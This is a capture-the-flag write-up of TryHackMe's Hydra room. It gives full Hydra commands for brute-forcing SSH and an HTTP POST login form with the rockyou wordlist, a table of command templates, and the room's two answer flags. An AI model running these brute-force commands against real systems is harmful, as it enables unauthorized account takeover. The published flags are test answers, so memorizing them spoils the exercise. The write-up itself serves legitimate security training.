# TryHackMe — Hydra: Write-Up

**Author:** [Calebe Araújo]  
**Platform:** TryHackMe  
**Room:** [Hydra](https://tryhackme.com/room/hydra)  
**Category:** Password Attacks / Credential Brute-Forcing  
**Difficulty:** Easy  

---

## Table of Contents

1. [Overview](#overview)
2. [Tool Introduction — Hydra](#tool-introduction--hydra)
3. [Task 1 — SSH Brute-Force](#task-1--ssh-brute-force)
4. [Task 2 — Web Form Brute-Force (POST)](#task-2--web-form-brute-force-post)
5. [Flags](#flags)
6. [Key Takeaways](#key-takeaways)

---

## Overview

This write-up documents the methodology and commands used in TryHackMe's Hydra room. The room introduces **THC-Hydra**, one of the most widely used online password-cracking tools in penetration testing engagements.

The two core objectives are:

- Brute-forcing SSH credentials using a known username and a password list.
- Brute-forcing a web application login form using the HTTP POST method.

Both attacks are performed against a single deployed machine using the account **molly** as the target username.

---

## Tool Introduction — Hydra

Hydra is a parallelized login cracker that supports a large number of protocols, including SSH, FTP, HTTP, HTTPS, SMB, RDP, and many others. It is a standard component of offensive security toolkits such as Kali Linux and Parrot OS.

### General Syntax

```bash
hydra -l <username> -P <wordlist> <TARGET_IP> <service>
```

### Core Options

| Option | Description |
|--------|-------------|
| `-l` | Single username for login |
| `-L` | File containing a list of usernames |
| `-p` | Single password to try |
| `-P` | File containing a list of passwords |
| `-t` | Number of parallel threads to spawn |
| `-s` | Specify a non-default port number |
| `-V` | Verbose mode — prints every attempt |
| `-f` | Stop after the first valid credential pair is found |

---

## Task 1 — SSH Brute-Force

### Objective

Brute-force molly's SSH password using Hydra and retrieve Flag 2.

### Methodology

SSH brute-forcing with Hydra requires only the target username, a password list, the target IP, and a thread count. Because SSH rate-limits connections, a low thread count (`-t 4`) avoids triggering lockout mechanisms while maintaining reasonable speed.

### Command

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP -t 4 ssh
```

### Option Breakdown

| Option | Value | Purpose |
|--------|-------|---------|
| `-l` | `molly` | Target SSH username |
| `-P` | `rockyou.txt` | Password wordlist |
| `-t` | `4` | Four parallel threads |
| `ssh` | — | Target protocol |

### Result

Hydra successfully identified molly's SSH password. After authenticating via SSH:

```bash
ssh molly@MACHINE_IP
```

Flag 2 was retrieved from molly's home directory.

---

## Task 2 — Web Form Brute-Force (POST)

### Objective

Brute-force the web application login form using the HTTP POST method and retrieve Flag 1.

### Methodology

Before running Hydra against a web form, it is necessary to identify:

1. The **login page path** (e.g., `/`, `/login`, `/login.php`).
2. The **form field names** for username and password (inspected via browser Developer Tools → Network tab, or by viewing the page source).
3. A **failure string** — a substring present in the server's response when a login attempt fails (e.g., `incorrect`, `Invalid credentials`).

Hydra uses this information to distinguish successful logins from failed ones.

### Command

```bash
sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Option Breakdown

| Option | Value | Purpose |
|--------|-------|---------|
| `-l` | `molly` | Target username |
| `-P` | `rockyou.txt` | Password wordlist |
| `http-post-form` | — | Specifies HTTP POST as the attack module |
| `/:username=^USER^&password=^PASS^` | — | Login path and form field mapping |
| `F=incorrect` | — | Failure string — marks an attempt as failed when present in the response |
| `-V` | — | Verbose output — prints every attempt with result |

### Format Reference

```
"<path>:<login_credentials>:<failure_condition>"
```

| Field | Value | Meaning |
|-------|-------|---------|
| `<path>` | `/` | Login form is at the root path |
| `username=^USER^` | — | `^USER^` is replaced with each username |
| `password=^PASS^` | — | `^PASS^` is replaced with each password from the list |
| `F=incorrect` | — | `F=` marks a failure string in the HTTP response body |

> **Note:** If the web server is running on a non-standard port, append `-s <port>` to the command.  
> Example: `-s 8080`

### Result

Hydra successfully identified molly's web application password. After logging into the web form, Flag 1 was presented on the authenticated page.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | Web application (POST brute-force) | `THM{2673a7dd116de68e85c48ec0b1f2612e}` |
| Flag 2 | SSH session — molly's home directory | `THM{c8eeb0468febbadea859baeb33b2541b}` |

---

## Key Takeaways

| Concept | Detail |
|---------|--------|
| **Protocol flexibility** | Hydra supports dozens of protocols with a consistent CLI syntax |
| **Thread control** | Lower thread counts (`-t 4`) are advisable for SSH to avoid triggering lockouts or IDS alerts |
| **Failure string identification** | Correctly identifying the failure string is critical — an incorrect string will cause Hydra to misidentify every attempt as successful |
| **Developer Tools** | Inspecting the Network tab in browser DevTools is the fastest way to identify form field names and request types before running an attack |
| **Wordlist quality** | The effectiveness of a brute-force attack depends heavily on the wordlist. `rockyou.txt` covers a large portion of commonly used passwords and is the standard starting point |

### Hydra Quick Reference

| Target | Command Template |
|--------|-----------------|
| SSH | `hydra -l <user> -P <wordlist> <IP> -t 4 ssh` |
| FTP | `hydra -l <user> -P <wordlist> ftp://<IP>` |
| HTTP POST | `hydra -l <user> -P <wordlist> <IP> http-post-form "<path>:<fields>:F=<fail_string>"` |
| Non-default port | Add `-s <port>` to any command |

---

*Write-up produced as part of an ongoing offensive security portfolio. All exercises were conducted within the TryHackMe learning platform's isolated lab environments.*
